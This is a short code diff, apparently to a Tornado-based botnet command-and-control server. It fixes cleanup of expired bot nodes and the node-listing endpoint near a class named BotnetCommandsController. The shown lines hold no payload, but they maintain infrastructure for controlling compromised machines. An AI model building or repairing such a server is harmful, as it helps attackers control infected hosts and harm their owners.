@@ -52,7 +52,7 @@ class ClientCache:
                 nodes_to_delete.append(key)
 
         for node in nodes_to_delete:
-            del nodes_to_delete[node]
+            del self.nodes[node]
 
 
 class MainHandler(tornado.web.RequestHandler):
@@ -66,10 +66,12 @@ class NodesHandler(tornado.web.RequestHandler):
     """
     """
     def get(self):
+        self.application.clients_cache.clean_up_expired()
         key = self.get_argument('key', '')
         if key:
             self.write(json.dumps(self.application.clients_cache.nodes.get(key, {})))
-        self.write(json.dumps(self.application.clients_cache.nodes))
+        else:
+            self.write(json.dumps(self.application.clients_cache.nodes))
 
 
 class CommandHandler(tornado.web.RequestHandler):
@@ -123,7 +125,6 @@ class BotnetCommandsController(tornado.web.RequestHandler):
             self.write(' && '.join(re))
 
         self.finish()  # write response to client
-        self.application.clients_cache.clean_up_expired()
 
 
 class Application(tornado.web.Application):
